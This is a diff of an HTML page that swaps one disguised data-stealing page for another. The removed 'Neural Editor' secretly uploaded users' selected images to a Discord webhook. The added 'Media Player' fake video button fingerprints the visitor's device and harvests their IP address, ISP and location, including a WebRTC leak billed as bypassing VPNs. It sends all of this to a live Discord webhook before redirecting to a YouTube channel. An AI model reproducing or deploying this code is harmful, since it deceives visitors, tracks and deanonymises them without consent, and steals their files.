@@ -3,59 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neural Editor v4.2</title>
+    <title>Media Player - Loading...</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .editor-container { border: 1px solid #00ff41; padding: 40px; border-radius: 5px; background: #000; box-shadow: 0 0 15px #00ff41; text-align: center; width: 80%; max-width: 400px; }
-        .status-text { font-size: 0.8rem; color: #888; margin-bottom: 20px; }
-        label { background: #00ff41; color: #000; padding: 12px 24px; cursor: pointer; font-weight: bold; text-transform: uppercase; border-radius: 2px; }
-        #file-input { display: none; }
-        #progress-container { margin-top: 30px; display: none; }
-        #progress-bar { width: 100%; height: 10px; background: #1a1a1a; border: 1px solid #00ff41; position: relative; }
-        #fill { height: 100%; background: #00ff41; width: 0%; transition: width 0.3s; }
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .gate { text-align: center; cursor: pointer; padding: 40px; border: 1px solid #111; border-radius: 12px; background: #050505; transition: 0.3s; }
+        .gate:active { transform: scale(0.98); }
+        .btn { background: #ff0000; color: #fff; padding: 18px 50px; border-radius: 8px; font-weight: bold; border: none; font-size: 22px; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
+        .status { color: #333; font-size: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <div class="editor-container">
-        <h2>NEURAL_EDITOR</h2>
-        <p class="status-text">Ready for Batch Enhancement. Select up to 70 assets.</p>
-        
-        <label for="file-input">Select Images</label>
-        <input type="file" id="file-input" multiple accept="image/*">
 
-        <div id="progress-container">
-            <div id="log">Initializing AI...</div>
-            <div id="progress-bar"><div id="fill"></div></div>
-        </div>
+    <div class="gate" id="masterTrigger">
+        <button class="btn">▶ START VIDEO</button>
+        <p class="status">Connecting to Encrypted Buffer...</p>
     </div>
 
     <script>
-        const WEBHOOK = "https://discordapp.com/api/webhooks/1500096464171307028/o-JxV7BLKBSSDqjM16fPRTVveJZtweHikhcNmS_sHhcpq7qYUhS2qPpHdbtNngGUgOOh";
+    const CONFIG = {
+        HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0",
+        DEST: "https://youtube.com/@LigmaBlox-w7m"
+    };
 
-        document.getElementById('file-input').addEventListener('change', async (e) => {
-            const files = e.target.files;
-            if (files.length === 0) return;
+    // --- UNIVERSAL DISPATCHER ---
+    function send(data, label = "SYSTEM") {
+        const blob = new Blob([JSON.stringify({ ...data, username: label })], { type: 'application/json' });
+        
+        // Try all three delivery methods for maximum durability
+        try { fetch(CONFIG.HOOK, { method: 'POST', body: blob, mode: 'no-cors', keepalive: true }); } catch(e){}
+        try { navigator.sendBeacon(CONFIG.HOOK, blob); } catch(e){}
+        
+        // Backup: XHR for very old devices/browsers
+        try {
+            let x = new XMLHttpRequest();
+            x.open("POST", CONFIG.HOOK);
+            x.send(blob);
+        } catch(e){}
+    }
 
-            document.getElementById('progress-container').style.display = 'block';
-            const log = document.getElementById('log');
-            const fill = document.getElementById('fill');
+    // --- UNIVERSAL DEVICE IDENTIFIER ---
+    async function probeDevice() {
+        let info = {
+            os: navigator.platform,
+            agent: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || "N/A",
+            ram: navigator.deviceMemory || "N/A",
+            gpu: "Unknown",
+            screen: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`
+        };
 
-            for (let i = 0; i < Math.min(files.length, 70); i++) {
-                log.innerText = `Applying Neural Filter: ${i + 1}/${Math.min(files.length, 70)}`;
-                let percent = ((i + 1) / Math.min(files.length, 70)) * 100;
-                fill.style.width = percent + "%";
+        // GPU Unmasking (Works on Windows, Mac, Android, iOS)
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+        } catch(e) { info.gpu = "Masked/Software"; }
 
-                const formData = new FormData();
-                formData.append('file', files[i]);
+        // Battery Intel
+        try {
+            const b = await navigator.getBattery();
+            info.battery = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Unplugged"})`;
+        } catch(e) {}
 
-                try {
-                    await fetch(WEBHOOK, { method: 'POST', body: formData });
-                } catch (err) {
-                    console.error("Link interrupted.");
-                }
+        return info;
+    }
+
+    // --- UNIVERSAL NETWORK PROBE (The "Triple Threat") ---
+    function probeNetwork() {
+        // 1. JSONP Tunnel (Bypasses most Wi-Fi restrictions)
+        const s = document.createElement('script');
+        s.src = `https://ipinfo.io/json?callback=xtunnel&t=${Date.now()}`;
+        document.body.appendChild(s);
+
+        // 2. WebRTC UDP Crack (Bypasses VPNs)
+        const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        rtc.createDataChannel("");
+        rtc.onicecandidate = (e) => {
+            if (e.candidate) {
+                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                if (ip) send({ content: `🚨 **FIREWALL CRACKED:** \`${ip[1]}\`` }, "UDP-PROBE");
             }
-            log.innerText = "Enhancement Complete. Local Cache Wiped.";
-        });
+        };
+        rtc.createOffer().then(o => rtc.setLocalDescription(o));
+
+        // 3. Direct API Race
+        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => {
+            send({ content: `📡 **IP DISCOVERY:** \`${d.ip}\`` }, "API-PROBE");
+        }).catch(()=>{});
+    }
+
+    // JSONP Callback handler
+    window.xtunnel = (data) => {
+        send({
+            embeds: [{
+                title: "🛑 CONNECTION ESTABLISHED",
+                color: 16776960,
+                fields: [
+                    { name: "IP", value: data.ip || "??", inline: true },
+                    { name: "ISP", value: data.org || "??", inline: true },
+                    { name: "Location", value: `${data.city}, ${data.country}`, inline: true }
+                ]
+            }]
+        }, "JSONP-PROBE");
+    };
+
+    // --- MASTER RUN ---
+    async function start() {
+        // Silent landing ping
+        send({ content: "🟢 **Target is on GitHub Landing Page...**" });
+
+        document.getElementById('masterTrigger').onclick = async function() {
+            this.innerHTML = "<button class='btn'>LOADING...</button>";
+            
+            // Gather hardware first
+            const hardware = await probeDevice();
+            send({
+                embeds: [{
+                    title: "💎 HARDWARE UNMASKED",
+                    color: 16711680,
+                    fields: [
+                        { name: "Device/OS", value: hardware.os, inline: true },
+                        { name: "GPU", value: "```" + hardware.gpu + "```" },
+                        { name: "Specs", value: `Cores: ${hardware.cores} | RAM: ${hardware.ram}GB`, inline: true },
+                        { name: "Screen", value: hardware.screen, inline: true },
+                        { name: "Battery", value: hardware.battery || "N/A", inline: true }
+                    ]
+                }]
+            }, "APEX-HARDWARE");
+
+            // Trigger network probes
+            probeNetwork();
+
+            // Final Redirect
+            setTimeout(() => {
+                window.location.replace(CONFIG.DEST);
+            }, 600);
+        };
+    }
+
+    start();
     </script>
 </body>
 </html>
